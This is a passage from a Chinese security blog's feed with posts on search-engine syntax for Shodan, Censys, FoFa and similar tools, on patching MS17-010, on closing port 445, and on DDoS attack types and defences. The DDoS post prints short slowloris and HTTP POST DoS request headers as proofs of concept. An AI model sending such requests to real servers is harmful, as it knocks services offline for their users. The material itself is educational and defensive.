<li>product：　　搜索指定的操作系统/软件/平台，例如 product:”Apache httpd”</li>
<li>version：　　搜索指定的软件版本，例如 version:”1.6.2”</li>
<li>geo：　　搜索指定的地理位置，例如 geo:”31.8639, 117.2808”</li>
<li>before/after：　　搜索指定收录时间前后的数据，格式为dd-mm-yy，例如 before:”11-11-15”</li>
<li>net：　　搜索指定的IP地址或子网，例如 net:”210.45.240.0/24”</li>
</ul>
<p>以上内容参考：<a href="http://xiaix.me/shodan-xin-shou-ru-keng-zhi-nan/" target="_blank" rel="external">http://xiaix.me/shodan-xin-shou-ru-keng-zhi-nan/</a></p>
<h3 id="censys搜索引擎"><a href="#censys搜索引擎" class="headerlink" title="censys搜索引擎"></a>censys搜索引擎</h3><p>censys搜索引擎功能与shodan类似，以下几个文档信息。<br>地址：<a href="https://www.censys.io/" target="_blank" rel="external">https://www.censys.io/</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">https://www.censys.io/certificates/<span class="built_in">help</span> 帮助文档</div><div class="line">https://www.censys.io/ipv4?q=  ip查询</div><div class="line">https://www.censys.io/domain?q=  域名查询</div><div class="line">https://www.censys.io/certificates?q= 证书查询</div></pre></td></tr></table></figure></p>
<h4 id="搜索语法-1"><a href="#搜索语法-1" class="headerlink" title="搜索语法"></a>搜索语法</h4><p>默认情况下censys支持全文检索。</p>
<ul>
<li>23.0.0.0/8 or 8.8.8.0/24　　可以使用and or not</li>
<li>80.http.get.status_code: 200　　指定状态</li>
<li>80.http.get.status_code:[200 TO 300]　　200-300之间的状态码</li>
<li>location.country_code: DE　　国家</li>
<li>protocols: (“23/telnet” or “21/ftp”)　　协议</li>
<li>tags: scada　　标签</li>
<li>80.http.get.headers.server：nginx　　服务器类型版本</li>
<li>autonomous_system.description: University　　系统描述</li>
<li>正则</li>
</ul>
<h3 id="钟馗之眼"><a href="#钟馗之眼" class="headerlink" title="钟馗之眼"></a>钟馗之眼</h3><p>钟馗之眼搜索引擎偏向web应用层面的搜索。<br>地址：<a href="https://www.zoomeye.org/" target="_blank" rel="external">https://www.zoomeye.org/</a></p>
<h4 id="搜索语法-2"><a href="#搜索语法-2" class="headerlink" title="搜索语法"></a>搜索语法</h4><ul>
<li>app:nginx　　组件名</li>
<li>ver:1.0　　版本</li>
<li>os:windows　　操作系统</li>
<li>country:”China”　　国家</li>
<li>city:”hangzhou”　　城市</li>
<li>port:80　　端口</li>
<li>hostname:google　　主机名 </li>
<li>site:thief.one　　网站域名</li>
<li>desc:nmask　　描述</li>
<li>keywords:nmask’blog　　关键词</li>
<li>service:ftp　　服务类型</li>
<li>ip:8.8.8.8　　ip地址</li>
<li>cidr:8.8.8.8/24　　ip地址段</li>
</ul>
<h3 id="FoFa搜索引擎"><a href="#FoFa搜索引擎" class="headerlink" title="FoFa搜索引擎"></a>FoFa搜索引擎</h3><p>FoFa搜索引擎偏向资产搜索。<br>地址：<a href="https://fofa.so" target="_blank" rel="external">https://fofa.so</a></p>
<h4 id="搜索语法-3"><a href="#搜索语法-3" class="headerlink" title="搜索语法"></a>搜索语法</h4><ul>
<li>title=”abc” 从标题中搜索abc。例：标题中有北京的网站。</li>
<li>header=”abc” 从http头中搜索abc。例：jboss服务器。</li>
<li>body=”abc” 从html正文中搜索abc。例：正文包含Hacked by。</li>
<li>domain=”qq.com” 搜索根域名带有qq.com的网站。例： 根域名是qq.com的网站。</li>
<li>host=”.gov.cn” 从url中搜索.gov.cn,注意搜索要用host作为名称。</li>
<li>port=”443” 查找对应443端口的资产。例： 查找对应443端口的资产。</li>
<li>ip=”1.1.1.1” 从ip中搜索包含1.1.1.1的网站,注意搜索要用ip作为名称。</li>
<li>protocol=”https” 搜索制定协议类型(在开启端口扫描的情况下有效)。例： 查询https协议资产。</li>
<li>city=”Beijing” 搜索指定城市的资产。例： 搜索指定城市的资产。</li>
<li>region=”Zhejiang” 搜索指定行政区的资产。例： 搜索指定行政区的资产。</li>
<li>country=”CN” 搜索指定国家(编码)的资产。例： 搜索指定国家(编码)的资产。</li>
<li>cert=”google.com” 搜索证书(https或者imaps等)中带有google.com的资产。</li>
</ul>
<p>高级搜索：</p>
<ul>
<li>title=”powered by” &amp;&amp; title!=discuz</li>
<li>title!=”powered by” &amp;&amp; body=discuz</li>
<li>( body=”content=\”WordPress” || (header=”X-Pingback” &amp;&amp; header=”/xmlrpc.php” &amp;&amp; body=”/wp-includes/“) ) &amp;&amp; host=”gov.cn” </li>
</ul>
<h3 id="Dnsdb搜索引擎"><a href="#Dnsdb搜索引擎" class="headerlink" title="Dnsdb搜索引擎"></a>Dnsdb搜索引擎</h3><p>dnsdb搜索引擎是一款针对dbs解析的查询平台。<br>地址：<a href="https://www.dnsdb.io/" target="_blank" rel="external">https://www.dnsdb.io/</a></p>
<h4 id="搜索语法-4"><a href="#搜索语法-4" class="headerlink" title="搜索语法"></a>搜索语法</h4><p>DnsDB查询语法结构为条件1 条件2 条件3 …., 每个条件以空格间隔, DnsDB 会把满足所有查询条件的结果返回给用户.</p>
<h5 id="域名查询条件"><a href="#域名查询条件" class="headerlink" title="域名查询条件"></a>域名查询条件</h5><p>域名查询是指查询顶级私有域名所有的DNS记录, 查询语法为domain:<example.com>.<br>例如查询google.com 的所有DNS记录: domain:google.com.<br>域名查询可以省略domain:.</example.com></p>
<h5 id="主机查询条件"><a href="#主机查询条件" class="headerlink" title="主机查询条件"></a>主机查询条件</h5><p>查询语法:host:<host><br>例如查询主机地址为mp3.example.com的DNS记录: host:map3.example.com<br>主机查询条件与域名查询查询条件的区别在于, 主机查询匹配的是DNS记录的Host值</host></p>
<h5 id="按DNS记录类型查询"><a href="#按DNS记录类型查询" class="headerlink" title="按DNS记录类型查询"></a>按DNS记录类型查询</h5><p>查询语法: type:<type name="">.<br>例如只查询A记录: type:a<br>使用条件:必须存在domain:或者host:条件,才可以使用type:查询语法</type></p>
<h5 id="按IP限制"><a href="#按IP限制" class="headerlink" title="按IP限制"></a>按IP限制</h5><p>查询语法: ip:<ip ip="" range=""><br>查询指定IP: ip:8.8.8.8, 该查询与直接输入8.8.8.8进行查询等效<br>查询指定IP范围: ip:8.8.8.8-8.8.255.255<br>CIDR: ip:8.8.0.0/24<br>IP最大范围限制65536个</ip></p>
<h5 id="条件组合查询的例子"><a href="#条件组合查询的例子" class="headerlink" title="条件组合查询的例子"></a>条件组合查询的例子</h5><p>查询google.com的所有A记录: google.com type:a</p>
<p>本文将会持续补充一些内容……</p>
<h3 id="传送门"><a href="#传送门" class="headerlink" title="传送门"></a>传送门</h3><p><a href="http://thief.one/2017/04/10/1/">【渗透神器系列】nc</a><br><a href="http://thief.one/2017/05/02/1/">【渗透神器系列】nmap</a><br><a href="http://thief.one/2017/04/27/1">【渗透神器系列】Fiddler</a><br><a href="http://thief.one/2017/02/09/WireShark%E8%BF%87%E6%BB%A4%E8%A7%84%E5%88%99/">【渗透神器系列】WireShark</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;动动指尖，弹指一挥间&lt;/blockquote&gt;&lt;br&gt;　　搜索引擎是我日常工作中用得最多的一款工具，国内常用的搜索引擎包括Baidu，sougou，bing等。但我本篇要纪录的并不是这些常用的搜索引擎，而是信息安全从业人员必备的几款网络搜索引擎。本篇要介绍的搜索引擎包括：Shodan，censys，钟馗之眼，Google，FoFa，Dnsdb等。介绍的内容主要是这几款搜索引擎的一些高级语法，掌握高级语法会让搜索结果更准确。&lt;br&gt;
    
    </summary>
    
      <category term="安全工具" scheme="http://thief.one/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="渗透神器" scheme="http://thief.one/tags/%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/"/>
    
      <category term="shodan" scheme="http://thief.one/tags/shodan/"/>
    
      <category term="censys" scheme="http://thief.one/tags/censys/"/>
    
      <category term="钟馗之眼" scheme="http://thief.one/tags/%E9%92%9F%E9%A6%97%E4%B9%8B%E7%9C%BC/"/>
    
      <category term="google" scheme="http://thief.one/tags/google/"/>
    
  </entry>
  
  <entry>
    <title>windows系统打MS17-010补丁</title>
    <link href="http://thief.one/2017/05/15/1/"/>
    <id>http://thief.one/2017/05/15/1/</id>
    <published>2017-05-15T11:45:31.000Z</published>
    <updated>2017-07-25T12:05:00.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">你转身的一瞬，我萧条的一生</blockquote><br>　　周一大早全民开始打补丁，由此可见此次蠕虫病毒影响空前绝后。而我在给自己电脑打补丁的时候，发现了一些问题，在此分享以帮助还未及时打补丁的朋友。<br><a id="more"></a></p>
<h3 id="传送门"><a href="#传送门" class="headerlink" title="传送门"></a>传送门</h3><p>需要关闭445端口的朋友可以参考教程:　<a href="http://thief.one/2017/05/13/2">windows关闭445端口</a></p>
<h3 id="微软漏洞信息官网挂了？"><a href="#微软漏洞信息官网挂了？" class="headerlink" title="微软漏洞信息官网挂了？"></a>微软漏洞信息官网挂了？</h3><p>　　今早我在访问　<a href="https://technet.microsoft.com/en-us/library/security/MS17-010" target="_blank" rel="external">微软漏洞信息官方网站</a>　准备下载补丁时，发现其网站出现502错误，不知道是不是由于访问量太高的缘由。我猜想此时微软高层的心情肯定是苦笑不得，从来没有被民众重视过的微软补丁在今日达到了一个下载高潮。由于官方渠道下载受阻，很多人无法得到补丁文件，从而没能顺利得安装好补丁，在此我给出网盘链接，里面是各个操作系统对应的补丁程序。</p>
<p>百度网盘链接：<a href="http://pan.baidu.com/s/1slfitD7" target="_blank" rel="external">http://pan.baidu.com/s/1slfitD7</a> 密码：dkoe</p>
<p>说明：网盘内每个操作系统对应一个压缩包，请下载后自行解压安装即可，如失效请留言告知！</p>
<h3 id="开启windows自动更新就ok了？"><a href="#开启windows自动更新就ok了？" class="headerlink" title="开启windows自动更新就ok了？"></a>开启windows自动更新就ok了？</h3><p>　　起初我在处理ms17-010补丁的时候，是选择开启windows自动更新功能，并且安装了最新的一些补丁。然而当我安装完后进行查看时，并没有发现KB4012212(windows7)补丁信息。无奈，只能自行下载ms17-010补丁安装包进行单独安装，安装完以后可以看到已安装的补丁中存在了KB4012212，所以我猜想自动更新是不包含ms17-010漏洞补丁的。</p>
<h3 id="如何查看已安装补丁信息？"><a href="#如何查看已安装补丁信息？" class="headerlink" title="如何查看已安装补丁信息？"></a>如何查看已安装补丁信息？</h3><p>查看已安装的补丁信息(cmd下输入以下命令)：</p>
<h4 id="方案一："><a href="#方案一：" class="headerlink" title="方案一："></a>方案一：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">systeminfo | findstr <span class="string">"KB4012212"</span></div></pre></td></tr></table></figure>
<p>如果有输出内容，说明打补丁成功；否则说明该补丁没有被成功安装。</p>
<h4 id="方案二："><a href="#方案二：" class="headerlink" title="方案二："></a>方案二：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">systeminfo &gt; systeminfo.txt</div></pre></td></tr></table></figure>
<p>打开生成的systeminfo.txt文件查看，里面包含了已安装补丁的KB编号信息。<br><img src="/upload_image/2017051501/1.png" alt=""></p>
<h3 id="ms17-010对应的KB编号"><a href="#ms17-010对应的KB编号" class="headerlink" title="ms17-010对应的KB编号"></a>ms17-010对应的KB编号</h3><p>各版本操作系统对应的KB号：</p>
<ul>
<li>windows Vista （KB4012598）</li>
<li>windows xp（KB4012598）</li>
<li>Windows Server 2008（KB4012598）</li>
<li>Windows 7（KB4012212、KB4012215）</li>
<li>Windows Server 2008 R2（KB4012212、KB4012215）</li>
<li>Windows 8.1（KB4012213、KB4012216）</li>
<li>Windows Server 2012 and Windows Server 2012 R2（KB4012213、KB4012214、KB4012216、KB4012217）</li>
<li>Windows RT 8.1（KB4012216）</li>
<li>Windows 10（KB4012216、KB4013198）</li>
<li>Windows Server 2016（KB4013198）</li>
</ul>
<p>安装完补丁后，请查看校验系统是否存在对应的KB号。</p>
<h3 id="MS对应的KB号"><a href="#MS对应的KB号" class="headerlink" title="MS对应的KB号"></a>MS对应的KB号</h3><p>请移步项目：<a href="https://github.com/tengzhangchao/microsoftSpider" target="_blank" rel="external">https://github.com/tengzhangchao/microsoftSpider</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;你转身的一瞬，我萧条的一生&lt;/blockquote&gt;&lt;br&gt;　　周一大早全民开始打补丁，由此可见此次蠕虫病毒影响空前绝后。而我在给自己电脑打补丁的时候，发现了一些问题，在此分享以帮助还未及时打补丁的朋友。&lt;br&gt;
    
    </summary>
    
      <category term="系统安全" scheme="http://thief.one/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="ms17-010" scheme="http://thief.one/tags/ms17-010/"/>
    
      <category term="windows补丁" scheme="http://thief.one/tags/windows%E8%A1%A5%E4%B8%81/"/>
    
  </entry>
  
  <entry>
    <title>windows关闭445端口</title>
    <link href="http://thief.one/2017/05/13/2/"/>
    <id>http://thief.one/2017/05/13/2/</id>
    <published>2017-05-13T01:44:49.000Z</published>
    <updated>2017-07-25T12:05:00.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">一二三四五，上山打老虎</blockquote><br>　　由于大规模蠕虫来袭，目前最紧急的事情就是关闭windows445端口，在此分享下windows关闭445端口的几种方案，适用于window2003/xp/windows7/windows8/windows10系统。<br><a id="more"></a></p>
<h3 id="传送门"><a href="#传送门" class="headerlink" title="传送门"></a>传送门</h3><p>需要打ms17-010系统补丁的朋友可以参考教程:　<a href="http://thief.one/2017/05/15/1">windows系统打MS17-010补丁</a></p>
<h3 id="修改注册表法"><a href="#修改注册表法" class="headerlink" title="修改注册表法"></a>修改注册表法</h3><p>为注册表添加一个键值，具体步骤：</p>
<ul>
<li>单击”开始”，”运行”，输入”regedit”打开注册表。</li>
<li>找到注册表项”HKEY_LOCAL_MACHINE\System\Controlset\Services\NetBT\Parameters”</li>
<li>选择”Parameters”右键新建”DWORD值”</li>
<li>将DWORD值重命名为”SMBDeviceEnabled”</li>
<li>右键单击”SMBDeviceEnabled”选择”修改”,在”数值数据”下，输入”0”</li>
</ul>
<p><img src="/upload_image/2017051302/3.png" alt=""></p>
<p>键具体内容如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Hive: HKEY_LOCAL_MACHINE</div><div class="line">Key: System\CurrentControlSet\Services\NetBT\Parameters</div><div class="line">Name: SMBDeviceEnabled</div><div class="line">Type: REG_DWORD</div><div class="line">Value: 0</div></pre></td></tr></table></figure></p>
<p>修改完注册表后重启计算机，然后CMD运行”netstat -an | findstr 445”查看445端口是否关闭。</p>
<h3 id="配置防火墙"><a href="#配置防火墙" class="headerlink" title="配置防火墙"></a>配置防火墙</h3><p>此方法不在于关闭自身445端口，而是为了阻断外界对本机445端口的连接访问。</p>
<p>防火墙高级设置—入站规则—右击新建规则—在对话框中选择UDP，端口号写上445—阻止链接。</p>
<p>新建完规则查看如下：<br><img src="/upload_image/2017051302/4.png" alt=""></p>
<h3 id="关闭server服务"><a href="#关闭server服务" class="headerlink" title="关闭server服务"></a>关闭server服务</h3><p>以管理员身份打开cmd，运行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">net stop server</div></pre></td></tr></table></figure></p>
<p>配置需要重新计算机生效，因为共享服务需要开启server，因此关闭server服务就不能使用共享服务（445端口服务）。</p>
<h3 id="网卡设置"><a href="#网卡设置" class="headerlink" title="网卡设置"></a>网卡设置</h3><h4 id="禁止Windows共享"><a href="#禁止Windows共享" class="headerlink" title="禁止Windows共享"></a>禁止Windows共享</h4><p>卸载下图两个组件，此操作的目的是禁止445端口。<br><img src="/upload_image/2017051302/1.png" alt=""></p>
<h4 id="禁止netbios服务"><a href="#禁止netbios服务" class="headerlink" title="禁止netbios服务"></a>禁止netbios服务</h4><p>此操作的目的是禁止137,139端口，关闭netbios服务。<br><img src="/upload_image/2017051302/2.png" alt=""></p>
<p>以上2步操作需要重启计算机生效。</p>
<h3 id="修改本地组策略"><a href="#修改本地组策略" class="headerlink" title="修改本地组策略"></a>修改本地组策略</h3><p>　　运行输入gpedit.msc打开本地组策略编辑器，计算机配置–windows设置–安全设置–ip安全策略，在本地计算机。通过修改本地组策略方式虽然比较麻烦，但是比较推荐此方法。<br>具体操作可参考：<a href="https://jingyan.baidu.com/article/d621e8da0abd192865913f1f.html" target="_blank" rel="external">https://jingyan.baidu.com/article/d621e8da0abd192865913f1f.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;一二三四五，上山打老虎&lt;/blockquote&gt;&lt;br&gt;　　由于大规模蠕虫来袭，目前最紧急的事情就是关闭windows445端口，在此分享下windows关闭445端口的几种方案，适用于window2003/xp/windows7/windows8/windows10系统。&lt;br&gt;
    
    </summary>
    
      <category term="系统安全" scheme="http://thief.one/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="445端口" scheme="http://thief.one/tags/445%E7%AB%AF%E5%8F%A3/"/>
    
  </entry>
  
  <entry>
    <title>浅谈DDos攻击与防御</title>
    <link href="http://thief.one/2017/05/10/1/"/>
    <id>http://thief.one/2017/05/10/1/</id>
    <published>2017-05-10T01:22:52.000Z</published>
    <updated>2017-07-25T12:05:00.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">水能载舟，亦能覆舟</blockquote><br>　　最近重新拜读了道哥的经典力作《白帽子讲Web安全》一书，发觉好书看一遍是不够的，每次品味都有不同的味道。道哥此书侧重于企业安全，即所讲所写偏重企业内部的安全建设，而不是针对某些漏洞大书特书。再次细读，深感需要做点笔记加强加强记忆，于是便以本篇开始，记录一些曾经看过的经典书籍的笔记。本篇主要用于记录《白帽子讲Web安全》读后感之DDos攻击与防御相关的知识。本篇记录的绝大部分内容来自《白帽子讲Web安全》，感谢道哥！<br><a id="more"></a></p>
<h3 id="DDos简介"><a href="#DDos简介" class="headerlink" title="DDos简介"></a>DDos简介</h3><p>　　DDos又叫分布式拒绝服务，全称Distributed Denial of Service，利用DDos造成的攻击称为拒绝服务攻击，其原理就是利用大量的请求造成资源过载，导致服务不可用。<br>　　DDos攻击从层次上可分为网络层攻击与应用层攻击，从攻击手法上可分为快型流量攻击与慢型流量攻击，但其原理都是造成资源过载，导致服务不可用。</p>
<h3 id="网络层DDos攻击"><a href="#网络层DDos攻击" class="headerlink" title="网络层DDos攻击"></a>网络层DDos攻击</h3><p>网络层DDos攻击包括SYN flood、UDP flood、ICMP flood等。</p>
<h4 id="SYN-flood攻击"><a href="#SYN-flood攻击" class="headerlink" title="SYN flood攻击"></a>SYN flood攻击</h4><p>　　SYN flood攻击主要利用了TCP三次握手过程中的bug，我们知道TCP三次握手过程是要建立连接的双方发送SYN，SYN+ACK，ACK数据包，而当攻击方随意构造源ip去发送SYN包时，服务器返回的SYN+ACK就不能得到应答（因为ip是随意构造的），此时服务器就会尝试重新发送，并且会有至少30s的等待时间，导致资源饱和服务不可用，此攻击属于慢型dos攻击。</p>
<h4 id="UDP-flood攻击"><a href="#UDP-flood攻击" class="headerlink" title="UDP flood攻击"></a>UDP flood攻击</h4><p>　　由于udp是一种无连接的协议，因此攻击者可以伪造大量的源IP地址去发送udp包，此种攻击属于大流量攻击。正常应用情况下，UDP包双向流量会基本相等，因此在消耗对方资源的时候也在消耗自己的资源。</p>
<h4 id="ICMP-flood攻击"><a href="#ICMP-flood攻击" class="headerlink" title="ICMP flood攻击"></a>ICMP flood攻击</h4><p>　　此攻击属于大流量攻击，其原理就是不断发送不正常的ICMP包（所谓不正常就是ICMP包内容很大），导致目标带宽被占用，但其本身资源也会被消耗。并且目前很多服务器都是禁ping的（在防火墙在可以屏蔽icmp包），因此这种方式已经落伍。</p>
<h3 id="网络层DDos防御"><a href="#网络层DDos防御" class="headerlink" title="网络层DDos防御"></a>网络层DDos防御</h3><ul>
<li>网络架构上做好优化，采用负载均衡分流。</li>
<li>添加抗DDos设备，流量清洗。</li>
<li>限制单ip请求频率。</li>
<li>防火墙等防护设置禁止icmp包等</li>
</ul>
<p>网络层的DDos攻击究其本质其实是无法防御的，我们能做得就是不断优化自身的网络架构，以及提升网络带宽。</p>
<h3 id="应用层DDos攻击"><a href="#应用层DDos攻击" class="headerlink" title="应用层DDos攻击"></a>应用层DDos攻击</h3><p>应用层DDos攻击不是发生在网络层，是发生在TCP建立握手成功之后，应用程序处理请求的时候。</p>
<h4 id="CC攻击"><a href="#CC攻击" class="headerlink" title="CC攻击"></a>CC攻击</h4><p>　　CC攻击还有一段比较有趣的来历，据说当时绿盟为了防御DDos攻击研发了一款产品，叫做“Collapasar”，能够有效的防御SYN flood攻击。然而黑客为了挑衅，研发了一款Challenge Collapasar工具（简称CC）。<br>　　CC攻击的原理，就是针对消耗资源比较大的页面不断发起不正常的请求，导致资源耗尽。因此在发送CC攻击前，我们需要寻找加载比较慢，消耗资源比较多的网页，比如需要查询数据库的页面、读写硬盘文件的等。通过cc攻击，使用爬虫对某些加载需要消耗大量资源的页面发起http请求。</p>
<h4 id="slowloris"><a href="#slowloris" class="headerlink" title="slowloris"></a>slowloris</h4><p>　　这是由于webserver中间件漏洞引发的拒绝服务攻击，其原理是以极低的速度往服务器发送HTTP请求。apache等中间件默认会设置最大并发链接数，而这种攻击就是会持续保持连接，导致服务饱和不可用。slowloris有点类似基于HTTP协议的SYN flood攻击。</p>
<h5 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h5><p>构造以下畸形http请求包<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">GET / HTTP/1.1\r\n</div><div class="line">Host: Victim host\r\n</div><div class="line">User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n</div><div class="line">Content-Length: 42\r\n</div></pre></td></tr></table></figure></p>
<p>完整的http请求头结尾应该是两次的\r\n\r\n，这里少了一次，因此服务器将会一直等待。</p>
<h4 id="HTTP-POST-DOS"><a href="#HTTP-POST-DOS" class="headerlink" title="HTTP POST DOS"></a>HTTP POST DOS</h4><p>　　其原理是在发送HTTP POST包时，指定一个非常大的Content-Length值，然后以极低的速度发包，保持连接不断，导致服务饱和不可用。</p>
<h5 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h5><p>构造以下畸形http请求包<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">GET / HTTP/1.1\r\n</div><div class="line">Host: Victim host\r\n</div><div class="line">User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n</div><div class="line">Content-Length: 9999999999\r\n\r\n</div></pre></td></tr></table></figure></p>
<h4 id="Slow-Read-attack"><a href="#Slow-Read-attack" class="headerlink" title="Slow Read attack"></a>Slow Read attack</h4><p>　　Slow Read attack攻击方式是采用调整TCP协议中的滑动窗口大小，来对服务器单次发送发送的数据大小进行控制，使得服务器需要对一个回应分成很多个包来发送。</p>
<h4 id="Server-Limit-Dos"><a href="#Server-Limit-Dos" class="headerlink" title="Server Limit Dos"></a>Server Limit Dos</h4><p>　　这是由于cookie导致的dos攻击，当然其原理还是基于webserver的特性。apache默认最大的http包头长度为8192字节，如果超出此长度，则会返回4xx错误。如果我们利用存储型xss漏洞，将一个超长的cookie写入客户端页面，则用户再访问此页面后，由于请求头加载了恶意的超长cookie，导致其不能访问该站的页面（除非清空cookie）</p>
<h4 id="ReDos"><a href="#ReDos" class="headerlink" title="ReDos"></a>ReDos</h4><p>　　这是由于代码写得有缺陷，导致使用正则时，会出现大量占用资源的情况，导致服务不可用，这是利用了正则表达式在匹配时的某些特性决定的。</p>
<h3 id="应用层DDos防御"><a href="#应用层DDos防御" class="headerlink" title="应用层DDos防御"></a>应用层DDos防御</h3><ul>
<li>判断User-Agent字段（不可靠，因为可以随意构造）</li>
<li>网页中镶嵌js代码（不可靠，因为爬虫也可携带浏览器引擎，或者执行js代码）</li>
<li>针对ip+cookie，限制访问频率（由于cookie可以更改，ip可以使用代理，或者肉鸡，也不可靠)</li>
<li>关闭apache最大连接数等，合理配置中间件，缓解ddos攻击。</li>
<li>页面中添加验证码，比如搜索数据库时。</li>
<li>编写代码时，尽量实现优化，并合理使用缓存技术，减少数据库的读取操作。</li>
</ul>
<p>　　应用层的防御有时比网络层的更难，因为导致应用层被dos攻击的因素非常多，有时往往是因为程序员的失误，导致某个页面加载需要消耗大量资源，有时是因为中间件配置不当等等。而应用层DDos防御的核心就是区分人与机器（爬虫），因为大量的请求不可能是人为的，肯定是机器构造的。因此如果能有效的区分人与爬虫行为，则可以很好地防御此攻击。</p>
<h3 id="无线DDOS"><a href="#无线DDOS" class="headerlink" title="无线DDOS"></a>无线DDOS</h3><p>@更新于2017年5月31日<br>参考：<a href="http://www.freebuf.com/articles/wireless/135598.html" target="_blank" rel="external">http://www.freebuf.com/articles/wireless/135598.html</a></p>
<h4 id="Auth-Flood攻击"><a href="#Auth-Flood攻击" class="headerlink" title="Auth Flood攻击"></a>Auth Flood攻击</h4><p>Auth Flood攻击：即身份验证洪水攻击。该攻击目标主要针对那些处于通过验证、和AP建立关联的关联客户端，攻击者将向AP发送大量伪造的身份验证请求帧（伪造的身份验证服务和状态代码），当收到大量伪造的身份验证请求超过所能承受的能力时，AP将断开其他无线服务连接。</p>
<h4 id="Deauth-Flood攻击"><a href="#Deauth-Flood攻击" class="headerlink" title="Deauth Flood攻击"></a>Deauth Flood攻击</h4><p>Deauth Flood攻击即为取消验证洪水攻击，它旨在通过欺骗从AP到客户端单播地址的取消身份验证帧来将客户端转为未关联/未认证的状态。对于目前的工具来说，这种形式的攻击在打断客户无线服务方面非常有效和快捷。一般来说，在攻击者发送另一个取消身份验证帧之前，客户端会重新关联和认证以再次获取服务。攻击者反复欺骗取消身份验证帧才能使所有客户端持续拒绝服务。</p>
<h4 id="Association-Flood攻击"><a href="#Association-Flood攻击" class="headerlink" title="Association Flood攻击"></a>Association Flood攻击</h4><p>Association Flood攻击即为关联洪水攻击。在无线路由器或者接入点内置一个列表即为连接状态表，里面可显示出所有与该AP建立连接的无线客户端状态。它试图通过利用大量模仿和伪造的无线客户端关联来填充AP的客户端关联表，从而达到淹没AP的目的。<br>由于开放身份验证（空身份验证）允许任何客户端通过身份验证后关联。利用这种漏洞的攻击者可以通过创建多个到达已连接或已关联的客户端来模仿很多客户端，从而淹没目标AP的客户端关联表。</p>
<h4 id="Disassociation-Flood攻击"><a href="#Disassociation-Flood攻击" class="headerlink" title="Disassociation Flood攻击"></a>Disassociation Flood攻击</h4><p>Disassociation Flood攻击即为取消关联洪水攻击，和deauthenticaiton flood攻击表现方式很相似。它通过欺骗从AP到客户端的取消关联帧来强制客户端成为未关联/未认证的状态。一般来说，在攻击者发送另一个取消关联帧之前，客户端会重新关联以再次获取服务。攻击者反复欺骗取消关联帧才能使客户端持续拒绝服务。<br>Disassociation Broadcast攻击和Disassociation Flood攻击原理基本一致，只是在发送程度及使用工具上有所区别，前者很多时候用于配合进行无线中间人攻击，而后者常用于目标确定的点对点无线DOS，比如破坏或干扰指定机构或部门的无线接入点等。</p>
<h4 id="RF-Jamming攻击"><a href="#RF-Jamming攻击" class="headerlink" title="RF Jamming攻击"></a>RF Jamming攻击</h4><p>RF Jamming攻击即为RF干扰攻击。该攻击是通过发出干扰射频达到破坏正常无线通信的目的。而前面几种攻击主要是基于无线通信过程及协议的。RF为射频，主要包括无线信号发射机及收信机等。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;水能载舟，亦能覆舟&lt;/blockquote&gt;&lt;br&gt;　　最近重新拜读了道哥的经典力作《白帽子讲Web安全》一书，发觉好书看一遍是不够的，每次品味都有不同的味道。道哥此书侧重于企业安全，即所讲所写偏重企业内部的安全建设，而不是针对某些漏洞大书特书。再次细读，深感需要做点笔记加强加强记忆，于是便以本篇开始，记录一些曾经看过的经典书籍的笔记。本篇主要用于记录《白帽子讲Web安全》读后感之DDos攻击与防御相关的知识。本篇记录的绝大部分内容来自《白帽子讲Web安全》，感谢道哥！&lt;br&gt;
    
    </summary>
    
      <category term="网络安全" scheme="http://thief.one/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="DDos" scheme="http://thief.one/tags/DDos/"/>
    
      <category term="网络安全" scheme="http://thief.one/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
      <category term="拒绝服务" scheme="http://thief.one/tags/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/"/>
    
  </entry>
  
</feed>
